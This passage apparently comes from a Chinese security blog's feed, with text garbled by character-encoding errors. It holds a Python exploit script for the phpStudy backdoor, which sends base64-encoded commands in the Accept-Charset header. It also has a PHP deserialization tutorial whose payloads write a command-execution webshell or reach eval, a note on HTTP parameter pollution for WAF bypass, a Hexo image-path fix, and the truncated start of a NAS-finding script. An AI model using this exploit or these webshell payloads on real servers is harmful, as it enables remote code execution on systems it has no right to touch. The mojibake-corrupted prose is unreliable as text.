      <link href="/2019/10/17/phpstudy2018-backdoor-exp/"/>
      <url>/2019/10/17/phpstudy2018-backdoor-exp/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-èµ·å› ">0x00 èµ·å› </h1><p>å‰å‡ ä¸ªæ˜ŸæœŸçœ‹åˆ°phpstudyå¸¦æœ‰åé—¨ç¨‹åºã€‚æ‹–åˆ°ç°åœ¨æ‰å¤ç°,çœ‹åˆ°å¯åˆ©ç”¨ä¾¿ç«‹å³å†™ä¸‹åˆ©ç”¨è„šæœ¬</p><a id="more"></a><h1 id="0x01-exp">0x01 exp</h1><pre><code class="language-python"># -*-coding:utf-8 -*-import base64import requestsdef Expoit(ip,exp):    payload = exp    pay = base64.b64encode(payload.encode('utf-8'))    headers = {    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&quot;,    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,    &quot;Connection&quot;: &quot;close&quot;,    &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;,    &quot;Accept-Charset&quot;: pay,    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,    }    print(headers)    url = ip    r = requests.get(url,headers=headers)Expoit(input(&quot;target url&gt;&quot;),input(&quot;payload&gt;&quot;))</code></pre><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpååºåˆ—åŒ–æ¼æ´å­¦ä¹ </title>
      <link href="/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-å†™åœ¨å‰é¢">0x00 å†™åœ¨å‰é¢</h1><p>PHPååºåˆ—åŒ–æ¼æ´è™½ç„¶åˆ©ç”¨çš„æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œä½†æ˜¯å¦‚æœå¯ä»¥åˆ©ç”¨ä¸€èˆ¬éƒ½ä¼šäº§ç”Ÿå¾ˆä¸¥é‡çš„åæœã€‚åœ¨æ˜¥æ‹›çš„æ—¶å€™å¾ˆå¤šå…¬å¸éƒ½é—®è¿‡è¿™ä¸ªé—®é¢˜ï¼Œè¯´æ˜è¿™ä¸ªååºåˆ—åŒ–æ¼æ´çš„æŠ€èƒ½ç‚¹ä¹Ÿæ˜¯å¾ˆå¤šå…¬å¸æ¯”è¾ƒå…³æ³¨çš„æŠ€èƒ½ç‚¹ã€‚</p><a id="more"></a><h1 id="0x01-PHPååºåˆ—åŒ–æ¼æ´">0x01 PHPååºåˆ—åŒ–æ¼æ´</h1><p><strong>PHPååºåˆ—åŒ–æ¼æ´</strong>,ä¸€ç›´å›´ç»•ç€ä¸¤ä¸ªå‡½æ•°serialize() å’Œunserialize()</p><pre><code class="language-php"> serialize() //æ˜¯ç”¨äºå°†ç±»è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸² unserialize() //ç”¨äºå°†å­—ç¬¦ä¸²è½¬æ¢å›ä¸€ä¸ªç±»</code></pre><h2 id="serialize">serialize()</h2><pre><code class="language-php">&lt;?phpclass fangxuliehua{    public $var1=&quot;test for fangxuliehua&quot;;}$fangxuliehua = new fangxuliehua();//æ ¹æ®fangxuliehuaç±»å®åˆ—åŒ–å¯¹è±¡$fangxueliehua_ser = serialize($fangxuliehua);print_r($fangxueliehua_ser);?&gt;</code></pre><p><img src="xueliehua1.jpg" alt="åºåˆ—åŒ–"></p><p>æˆ‘ä»¬è¿™è¾¹åˆ›å»ºäº†æ–°çš„å¯¹è±¡ï¼Œå¹¶å°†ä»–åºåˆ—åŒ–æ‰“å°å‡ºæ¥ã€‚ç»“æœä¸ºï¼š</p><pre><code class="language-json">O:12:&quot;fangxuliehua&quot;:1:{s:4:&quot;var1&quot;;s:4:&quot;test&quot;;}</code></pre><blockquote><p>è¿™é‡Œçš„<strong>O</strong>ä»£è¡¨çš„æ˜¯å­˜å‚¨å¯¹è±¡(Object),<strong>12</strong>åˆ™æ˜¯12ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å­˜å‚¨å¯¹è±¡é‡Œæœ‰12ä¸ªå­—ç¬¦ã€‚<strong>â€œfangxuliehuaâ€<strong>åˆ™æ˜¯å¯¹è±¡çš„åç§°ï¼Œè¿™é‡Œçš„</strong>1</strong>åˆ™ä»£è¡¨äº†**{s:4:â€œvar1â€;s:4:â€œtestâ€;}** é‡Œé¢æœ‰ä¸€ä¸ªå€¼ã€‚<strong>s</strong>è¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œ<strong>4</strong>åˆ™é•¿åº¦ã€‚**â€œvar1â€**ä¸ºå­—ç¬¦ä¸²åå­—ï¼Œåé¢çš„ç›¸åŒ</p></blockquote><h2 id="unserialize">unserialize()</h2><p>ä¸ serialize() å¯¹åº”çš„ï¼Œunserialize()å¯ä»¥ä»å·²å­˜å‚¨çš„è¡¨ç¤ºä¸­åˆ›å»ºPHPçš„å€¼ï¼Œå•å°±æœ¬æ¬¡æ‰€å…³å¿ƒçš„ç¯å¢ƒè€Œè¨€ï¼Œå¯ä»¥ä»åºåˆ—åŒ–åçš„ç»“æœä¸­æ¢å¤å¯¹è±¡ï¼ˆobjectï¼‰ã€‚</p><pre><code class="language-php">&lt;?php    class fanguxliehua{    public $var1=&quot;test&quot;;}$class= 'O:12:&quot;fangxuliehua&quot;:1:{s:4:&quot;var1&quot;;s:4:&quot;test&quot;;}';print_r($class);echo &quot;&lt;/br&gt;&quot;;$class_unser=unserialize($class);print_r($class_unser);?&gt;</code></pre><p><img src="fangxuliehua2.jpg" alt="ååºåˆ—åŒ–"></p><p><strong>tips:è¿™é‡Œä½¿ç”¨unserialize()æ—¶ï¼Œä¼šè°ƒç”¨__wakeup()æˆå‘˜å‡½æ•°</strong></p><h1 id="0x02-ååºåˆ—åŒ–æ¼æ´äº§ç”ŸåŸå› ">0x02 ååºåˆ—åŒ–æ¼æ´äº§ç”ŸåŸå› </h1><p>å½“ä¼ ç»™ unserialize() çš„å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä»è€Œæ§åˆ¶å¯¹è±¡å†…éƒ¨çš„å˜é‡ç”šè‡³æ˜¯å‡½æ•°ã€‚</p><h1 id="0x03-åˆ©ç”¨å‡½æ•°æ„é€ PAYLOAD">0x03 åˆ©ç”¨å‡½æ•°æ„é€ PAYLOAD</h1><h3 id="Magic-function">Magic function</h3><p>phpä¸­æœ‰ä¸€ç±»ç‰¹æ®Šçš„æ–¹æ³•å«&quot;é­”æ³•å‡½æ•°&quot;(Magic function)ï¼Œ è¿™é‡Œæˆ‘åˆ—å‡ºäº†ä¸ php(å)åºåˆ—åŒ–æœ‰å…³çš„å‡ ä¸ªé­”æ³•å‡½æ•°:</p><pre><code class="language-php">__construct()//å½“ä¸€ä¸ªå¯¹è±¡åˆ›é€ æ—¶è¢«è°ƒç”¨__destruct()//å½“å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__wakeup()//ä½¿ç”¨unserialize()æ—¶è§¦å‘__sleep()//ä½¿ç”¨serialize()æ—¶è§¦å‘__toString()//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__get()//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®__set()//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset()//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset()//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__invoke()//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</code></pre><p>è¿™é‡Œæˆ‘ä»¬ç€é‡å…³æ³¨ä¸€ä¸‹å‡ ä¸ªï¼š</p><ul><li><p>æ„é€ å‡½æ•°__construct()ï¼šå½“å¯¹è±¡åˆ›å»º(new)æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„ã€‚</p></li><li><p>ææ„å‡½æ•°__destruct()ï¼šå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚</p></li><li><p>__wakeup() ï¼šå¦‚å‰æ‰€æï¼Œunserialize()æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚</p></li></ul><p>ä»£ç å¦‚ä¸‹:</p><pre><code class="language-php">&lt;?phpclass test{    var $var='123';    function __wakeup(){        echo &quot;__wakeup&quot;.&quot;&lt;br&gt;&quot;;    }    function __construct(){        echo &quot;__construct&quot;.&quot;&lt;br&gt;&quot;;    }    function __destruct(){        echo &quot;__destruct&quot;.&quot;&lt;br&gt;&quot;;    }}echo &quot;åºåˆ—åŒ–æ‰€è°ƒç”¨çš„å‡½æ•°:&quot;.&quot;&lt;br&gt;&quot;;$data=new test();//æ ¹æ®testç±»å®åˆ—åŒ–å¯¹è±¡$data=serialize($data);echo &quot;ååºåˆ—åŒ–æ‰€è°ƒç”¨çš„å‡½æ•°:&quot;.&quot;&lt;br&gt;&quot;;$data1=unserialize($data);print_r($data1);?&gt;</code></pre><p><img src="xuliehua3.jpg" alt="(å)åºåˆ—åŒ–"></p><h3 id="åˆ©ç”¨ç¤ºèŒƒ">åˆ©ç”¨ç¤ºèŒƒ</h3><h4 id="wakeup-æˆ–-destruct">_wakeup() æˆ–__destruct()</h4><p>å‰é¢è¯´äº†åˆ©ç”¨éƒ½æ˜¯åŸºäºâ€œè‡ªåŠ¨è°ƒç”¨â€çš„magic functionã€‚ä»è€Œå½“æˆ‘ä»¬æ§åˆ¶åºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶å¯ä»¥å»ç›´æ¥è§¦å‘å®ƒä»¬ã€‚</p><p>è¿™é‡Œé’ˆå¯¹ __wakeup() åœºæ™¯åšä¸ªå®éªŒã€‚å‡è®¾indexæºç å¦‚ä¸‹ï¼š</p><pre><code class="language-php">&lt;?phpclass test{var $test = 'test';function __wakeup(){$fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;) ;fwrite($fp,$this-&gt;test);fclose($fp);}}$class_get = $_GET['test'];print_r($class_get);echo &quot;&lt;/br&gt;&quot;;$class_get_unser = unserialize($class_get);include_once(&quot;webshell.php&quot;) //åŒ…å«ä¸€ä¸‹ï¼Œè®©å®ƒèƒ½æ˜¾ç¤ºæ•ˆæœ    ?&gt;</code></pre><p>webshell.phpéœ€è¦è‡ªå·±å»ºç«‹ã€‚åœ¨åŒç›®å½•ä¸‹å»ºç«‹äº†ä¸€ä¸ªwebshell.phpï¼Œæœ€å…ˆè®¿é—®index.php</p><p>åŸºæœ¬æ€è·¯æ˜¯ï¼Œé€šè¿‡<strong>serialize()<strong>å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä¹‹åå†ä¼ è¿›å»ã€‚å‡è®¾æˆ‘ä»¬å·²çŸ¥index.phpæºç ã€‚æŠŠå¯¹è±¡ä¸­çš„</strong>$test</strong>èµ‹å€¼å†è°ƒç”¨<strong>unserialize()<strong>æ—¶ä¼šé€šè¿‡</strong>__wakeup()<strong>æŠŠ</strong>$test</strong>çš„å†™å…¥åˆ°shell.phpä¸­ã€‚</p><p>æˆ‘ä»¬å†™ä¸ªphpè„šæœ¬:</p><pre><code class="language-php">class payload{public $target=&quot;&lt;?php $a=$_GET[cmd];system($a);?&gt;&quot;;}$a =serialize(new payload);echo $a;</code></pre><p>åºåˆ—åŒ–åè¾“å‡º:</p><pre><code class="language-php">O:7:&quot;payload&quot;:1:{s:4:&quot;test&quot;;s:33:&quot;&quot;;}</code></pre><p>s:33:&quot;&quot;é‡Œé¢æ²¡æœ‰payloadæˆ‘ä»¬è‡ªå·±å†™è¿›å»:</p><p><strong>tips:ä¸target=é‡Œé¢çš„?&gt;&quot;å‘ç”Ÿäº†å†²çªï¼Œè¿˜æœªæ‰¾åˆ°è§£å†³æ–¹æ¡ˆ</strong></p><pre><code class="language-php">O:7:&quot;payload&quot;:1:{s:4:&quot;test&quot;;s:33:&quot;&lt;?php $a=$_GET[cmd];system($a);?&gt;&quot;;}</code></pre><p><img src="fangxuliehua5.jpg" alt="ååºåˆ—åŒ–æ¼æ´"></p><p>æ‰§è¡ŒæˆåŠŸï¼</p><h3 id="å…¶ä»–Magic-functionçš„åˆ©ç”¨">å…¶ä»–Magic functionçš„åˆ©ç”¨</h3><p>ä½†å¦‚æœä¸€æ¬¡unserialize()ä¸­å¹¶ä¸ä¼šç›´æ¥è°ƒç”¨çš„é­”æœ¯å‡½æ•°ï¼Œæ¯”å¦‚å‰é¢æåˆ°çš„__construct()ï¼Œæ˜¯ä¸æ˜¯å°±æ²¡æœ‰åˆ©ç”¨ä»·å€¼å‘¢ï¼Ÿå¹¶ä¸æ˜¯ã€‚ç„¶è€Œç±»ä¼¼äºPWNä¸­çš„ROPï¼Œæœ‰æ—¶å€™ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œç”±å®ƒè°ƒç”¨çš„__wakeup()ä¸­åˆå»è°ƒç”¨äº†å…¶ä»–çš„å¯¹è±¡ï¼Œç”±æ­¤å¯ä»¥æº¯æºè€Œä¸Šï¼Œåˆ©ç”¨ä¸€æ¬¡æ¬¡çš„â€œgadgetâ€æ‰¾åˆ°æ¼æ´ç‚¹ã€‚</p><pre><code class="language-php">class fangxuliehua_1{function __construct($test){ $fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;) ;        fwrite($fp,$this-&gt;test);        fclose($fp);}}class fangxuliehua_2{public $test='test';function __wakeup(){     $obj=new fangxuliehua_1($this-&gt;test);    }}$class_get = $_GET['test'];print_r($class_get);echo &quot;&lt;/br&gt;&quot;;$class_get_unser = unserialize($class_get);include_once(&quot;webshell.php&quot;);//åŒ…å«ä¸€ä¸‹ï¼Œè®©å®ƒèƒ½æ˜¾ç¤ºæ•ˆæœ</code></pre><p>è¿™é‡Œæˆ‘ä»¬ç»™testä¼ å…¥æ„é€ å¥½çš„åºåˆ—åŒ–å­—ç¬¦ä¸²åï¼Œè¿›è¡Œååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨ __wakeup()å‡½æ•°ï¼Œä»è€Œåœ¨new fangxuliehua_1()ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡fangxuliehua_1ä¸­çš„__construct()æ–¹æ³•ï¼Œä»è€ŒæŠŠ<code>&lt;?php phpinfo() ?&gt;</code>å†™å…¥åˆ° webshell.phpä¸­ã€‚</p><pre><code class="language-php">O:14:&quot;fangxuliehua_2&quot;:1:{s:4:&quot;test&quot;;s:18:&quot;&lt;?php%20phpinfo();?&gt;&quot;;}</code></pre><p><img src="fangxuliehua6.jpg" alt="è°ƒç”¨wakeup"></p><h1 id="0x04-åˆ©ç”¨æ™®é€šæˆå‘˜æ–¹æ³•">0x04 åˆ©ç”¨æ™®é€šæˆå‘˜æ–¹æ³•</h1><p>å‰é¢è°ˆåˆ°çš„åˆ©ç”¨éƒ½æ˜¯åŸºäºâ€œè‡ªåŠ¨è°ƒç”¨â€çš„magic functionã€‚ä½†å½“æ¼æ´/å±é™©ä»£ç å­˜åœ¨ç±»çš„æ™®é€šæ–¹æ³•ä¸­ï¼Œå°±ä¸èƒ½æŒ‡æœ›é€šè¿‡â€œè‡ªåŠ¨è°ƒç”¨â€æ¥è¾¾åˆ°ç›®çš„äº†ã€‚è¿™æ—¶çš„åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹ï¼Œå¯»æ‰¾ç›¸åŒçš„å‡½æ•°åï¼ŒæŠŠæ•æ„Ÿå‡½æ•°å’Œç±»è”ç³»åœ¨ä¸€èµ·ã€‚</p><pre><code class="language-php">&lt;?phpclass itishead{public $test;function __construct(){$this-&gt;test= new itisbody();}function __destruct(){$this-&gt;test-&gt;action();}}class itisbody{function action(){echo &quot;hereisbody:)&quot;;}}class itisfoot{public $test2;function action(){eval($this-&gt;test2);}}$class = new itishead();unserialize($_GET['test']);?&gt;</code></pre><p>æœ¬æ„ä¸Šï¼Œnewä¸€ä¸ªæ–°çš„itisheadå¯¹è±¡åï¼Œè°ƒç”¨_construct()ï¼Œå…¶ä¸­åˆnewäº†itisbodyå¯¹è±¡ã€‚åœ¨ç»“æŸåä¼šè°ƒç”¨__destruct()ï¼Œå…¶ä¸­ä¼šè°ƒç”¨action()ï¼Œä»è€Œè¾“å‡º itisbodyã€‚</p><p>åˆ©ç”¨ä»£ç :</p><pre><code class="language-php">&lt;?phpclass itishead {    var $test;    function __construct() {        $this-&gt;test = new itisfoot();    }}class itisfoot {    var $test2 = &quot;phpinfo();&quot;;}echo serialize(new itishead());?&gt;</code></pre><p>ç”Ÿæˆï¼š</p><pre><code class="language-php">O:8:&quot;itishead&quot;:1:{s:4:&quot;test&quot;;O:8:&quot;itisfoot&quot;:1:{s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;}}</code></pre><p>æŠŠpayloadä¼ è¿›å»:</p><p><img src="fangxuliehua7.jpg" alt="åˆ©ç”¨æˆåŠŸæˆªå›¾"></p><p>åˆ©ç”¨æˆåŠŸï¼</p><blockquote><p>å‚è€ƒé“¾æ¥:<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p></blockquote><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆç»å…¸æ¼æ´HTTPå‚æ•°æ±¡æŸ“</title>
      <link href="/2019/09/24/http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/"/>
      <url>/2019/09/24/http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-é—®é¢˜ç”±æ¥">0x00 é—®é¢˜ç”±æ¥</h1><p>åœ¨å…ˆçŸ¥ç¤¾åŒºçœ‹åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œä»<strong>HTTPå‚æ•°æ±¡æŸ“</strong>è¾¾æˆsqlæ³¨å…¥ã€‚</p><p>æœ‰ç‚¹ä¸ç†è§£HTTPå‚æ•°æ±¡æŸ“æ˜¯ä»€ä¹ˆï¼Œäºæ˜¯å°±å»ç¿»äº†ä¸€äº›èµ„æ–™å’Œçœ‹äº†è§†é¢‘è¿‡æ¥æ€»ç»“ä¸€ä¸‹ã€‚</p><a id="more"></a><h1 id="0x01-ä»€ä¹ˆæ˜¯HTTPå¸¸æ•°æ±¡æŸ“">0x01 ä»€ä¹ˆæ˜¯HTTPå¸¸æ•°æ±¡æŸ“</h1><p>HTTPå‚æ•°æ±¡æŸ“ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯ç»™ä¸€ä¸ªå‚æ•°é™„ä¸Šä¸¤ä¸ªæˆ–è€…ä¸¤ä¸ªä»¥ä¸Šçš„valueã€‚å¯¹äºä¸åŒçš„å¼•æ“å¼•ç”¨çš„valueä¼šä¸åŒã€‚</p><p><strong>å‡è®¾:</strong></p><p>å¦‚æœæ˜¯jsp+tomcat è¿”å›çš„è¯·æ±‚æ˜¯ç¬¬ä¸€ä¸ªvalueï¼Œ</p><p>å¦‚æœphp+apache è¿”å›çš„è¯·æ±‚æ˜¯ç¬¬äºŒä¸ªvalueï¼Œ</p><p>å¦‚æœæ˜¯asp+iis åˆ™ä¼šè¿”å›ä¸¤ä¸ªä¸€èµ·çš„value</p><h1 id="0x02-ä¸€äº›ä¾‹å­">0x02 ä¸€äº›ä¾‹å­</h1><h3 id="1-å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç½‘ç«™http-hacker-net">1.å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç½‘ç«™http://hacker.net/</h3><p><a href="http://hacker.net/search.php?page=10&amp;page=hacker" target="_blank" rel="noopener">http://hacker.net/search.php?page=10&amp;page=hacker</a></p><p>å½“æœåŠ¡å™¨é‡åˆ°åŒä¸€ä¸ªå‚æ•°èµ‹å€¼ä¸åŒæ•°å€¼æ—¶ï¼Œä¼šå°†ä»–ä»¬è¿æ¥èµ·æ¥ï¼Œhackerå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥ç»•è¿‡é»‘åå•ä¾‹å¦‚</p><p><a href="http://hacker.net/search.php?page=select" target="_blank" rel="noopener">http://hacker.net/search.php?page=select</a> 1&amp;page=2,3,database()</p><p>ä¸æ˜¯åœ¨é»‘åå•ä¸­çš„æ¨¡å¼ï¼Œä¸ä¼šè§¦å‘é»‘åå•çš„æ‹¦æˆªåŠŸèƒ½ï¼Œå…¶æ¬¡ï¼Œç”±äºwebç¨‹åºä¼šé‡‡å–è¿æ¥æ“ä½œï¼Œå°†å‰åçš„å†…å®¹è¿æ¥èµ·æ¥ï¼ŒSQLæ³¨å…¥è¡Œä¸ºæ‰èƒ½å¤Ÿè¢«æ‰§è¡Œ</p><h1 id="0x03-æ³¨å…¥å’ŒHTTPå‚æ•°æ±¡æŸ“æœ‰ä»€ä¹ˆå…³ç³»">0x03 æ³¨å…¥å’ŒHTTPå‚æ•°æ±¡æŸ“æœ‰ä»€ä¹ˆå…³ç³»</h1><p>å¦‚æœè¯¥ç½‘ç«™æ˜¯é‡‡ç”¨ä¸¤ä¸ªä¸€èµ·çš„valueä¸€èµ·è¿”å›ï¼Œåˆ™å¯ä»¥ç”¨äºBypass WAFï¼Œä¹Ÿå¯ä»¥ç”¨äºXSS.</p><p>æœ€ç»ˆå–å†³äºwebæœåŠ¡å™¨</p><h1 id="0x04-ç»“å°¾">0x04 ç»“å°¾</h1><p>ç»å…¸çš„æ¼æ´ä¸ä»£è¡¨ç°åœ¨æ²¡æœ‰ï¼Œå¯ä»¥ç»“åˆä¸€äº›payloadæ¥è¾¾æˆè¿‡WAFã€‚</p><p>tips:æœ‰ç‚¹å°ä¹±ã€‚æˆ‘çœ‹äº†ä¹Ÿæœ‰ç‚¹è¿·èŒ«äº†xD</p><blockquote><p><strong>å‚è€ƒé“¾æ¥</strong>:<a href="https://v.qq.com/x/page/k0870cdqlsb.html" target="_blank" rel="noopener">https://v.qq.com/x/page/k0870cdqlsb.html</a></p></blockquote><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexoæ’å…¥å›¾ç‰‡é—®é¢˜çš„æ€»ç»“</title>
      <link href="/2019/09/18/Hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2019/09/18/Hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-èµ·å› ">0x00 èµ·å› :</h1><p>æ’å…¥å›¾ç‰‡çš„æ—¶å€™hexo-asset-image æ’ä»¶ä¼šåœ¨å›¾ç‰‡çš„è·¯å¾„å‰é¢è‡ªåŠ¨æ·»åŠ /.io/</p><p><img src="io.png" alt="1"></p><a id="more"></a><h1 id="0x01-ç»è¿‡äº†ä¸€ç³»åˆ—çš„æµ‹è¯•æ‰¾å‡ºäº†ä¸€ä¸‹å‡ ä¸ªé—®é¢˜">0x01 ç»è¿‡äº†ä¸€ç³»åˆ—çš„æµ‹è¯•æ‰¾å‡ºäº†ä¸€ä¸‹å‡ ä¸ªé—®é¢˜:</h1><ul><li><p><strong>é—®é¢˜1</strong></p><p>Hexoç‰ˆæœ¬ä»¥åŠæ’ä»¶ä¸æ˜¯æœ€æ–°</p><pre><code class="language-bash">hexo v</code></pre></li><li><p><strong>é—®é¢˜2</strong></p><p>æ²¡æœ‰ç”¨<code>hexo n &quot;string&quot;</code> æ–°å¢æ–‡ç« ã€‚</p></li><li><p><strong>é—®é¢˜3</strong></p><p>å›¾ç‰‡è·¯å¾„çš„**<code>æ–œæ†</code>**é—®é¢˜ (<code>/</code>)æ­£æ–œæ†å’Œ( <code>\</code>)åæ–œæ†,</p><p>å¦‚æœå›¾ç‰‡æ˜¯ç›´æ¥è„±è¿›Makedownï¼Œå®ƒä¼šå†™è·¯å¾„çš„æ˜¯åæ–œæ†</p><pre><code>![]xx\xx.png</code></pre><p>ä¼šè®©hexo-asset-imageæ’ä»¶ è‡ªåŠ¨è¯†åˆ«æˆï¼ŒåŠ ä¸€ä¸ªåå­—</p><p>æ­£å¸¸çš„ï¼šBugKuCTF/xx.png</p><p>é”™è¯¯çš„ï¼šBugKuCTF/BugKuCTFxx.png</p><p><img src="hexo.PNG" alt></p></li></ul><p>çº¢è‰² æ˜¯é”™çš„</p><p>è“è‰² æ˜¯å¯¹çš„</p><ul><li><p><strong>é—®é¢˜4</strong></p><p>å¦‚æœåœ¨æ—§ç‰ˆæœ¬çš„Hexoå®‰è£…è¿‡ï¼Œhexo-asset-image æ’ä»¶</p><p>é‚£å°±éœ€è¦é‡è£…ä¸€é</p><pre><code class="language-bash">npm remove hexo-asset-imagenpm install hexo-asset-image --save</code></pre></li><li><p><strong>é—®é¢˜5</strong></p><p>è¿™ä¸ªé—®é¢˜æˆ‘ä¸çŸ¥é“æ˜¯ä¸æ˜¯æ‰€æœ‰äººéƒ½ä¼šã€‚åœ¨makedownä¸‹ï¼Œä¸åŒºåˆ†è·¯å¾„å¤§å°å†™ï¼Œåœ¨hexoä¸Šä¼ åç½‘é¡µä¸ŠåŒºåˆ†å¤§å°å†™</p><p><img src="1.PNG" alt></p><h1 id="0x02-æœ€ç›´æ¥æœ€æ¥åœ°æ°”è§£å†³é—®é¢˜çš„åŠæ³•">0x02 æœ€ç›´æ¥æœ€æ¥åœ°æ°”è§£å†³é—®é¢˜çš„åŠæ³•</h1><p>å°±æ˜¯å»ä¿®æ”¹æ’ä»¶æºä»£ç </p><p>ä½ç½®: node_modules\hexo-asset-image\index.js</p></li></ul><p><strong>tips: è¿™æ˜¯æˆ‘ä¸ªäººåšå®¢hexoæ’å…¥å›¾ç‰‡æ—¶å‡ºé”™çš„é—®é¢˜,æˆ‘ç”¨çš„Makedownæ˜¯Typoraï¼Œä¸åŒçš„ä¸»é¢˜æœ‰ä¸ä¸€æ ·çš„æ¸²æŸ“å›¾ç‰‡è·¯å¾„çš„æ–¹å¼ï¼Œæ ¹æ®ä¸åŒçš„æ–¹å¼å»ä¿®æ”¹æ’ä»¶ä»£ç ã€‚æœ‰èƒ½åŠ›å¯ä»¥è‡ªå·±å†™æ’ä»¶=w=</strong></p><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonScript:Search_loaclNAS</title>
      <link href="/2019/06/20/%E6%9C%AC%E5%9C%B0NAS%E6%89%AB%E6%8F%8F/"/>
      <url>/2019/06/20/%E6%9C%AC%E5%9C%B0NAS%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-ä»‹ç»">0x00 ä»‹ç»</h1><p>æ¯æ¬¡éƒ½ä¼šæŠ˜è…¾ä¸€ä¸‹å®è®­å®¤çš„ è½¯è·¯ç”±ã€‚ä¸æ˜¯æ¢linuxå°±æ˜¯åæ‰æœºå­ï¼Œå¶å°”è¿˜å¿˜è®°NASé…çš„å›ºå®šIPã€‚</p><p>æ‰€ä»¥å†™ä¸‹äº†æŸ¥æ‰¾æœ¬åœ°NASè„šæœ¬ã€‚</p><a id="more"></a><pre><code class="language-Python">import socketimport reimport threadingprint(&quot;&quot;&quot;[æœç´¢æœ¬åœ°NAS-Version 0.1]\né»˜è®¤æ‰«ææœ€åä¸€ä¸ªç½‘æ®µ1.1.1./24&quot;&quot;&quot;)host = input(&quot;æœ¬åœ°IP&gt;&quot;)def searchNAS(i):    ip = host+str(i)    try:        Hostname = socket.gethostbyaddr(ip)        match = re.search(r'NAS-SERVER',str(Hostname)).group()        if match == &quot;NAS-SERVER&quot;:            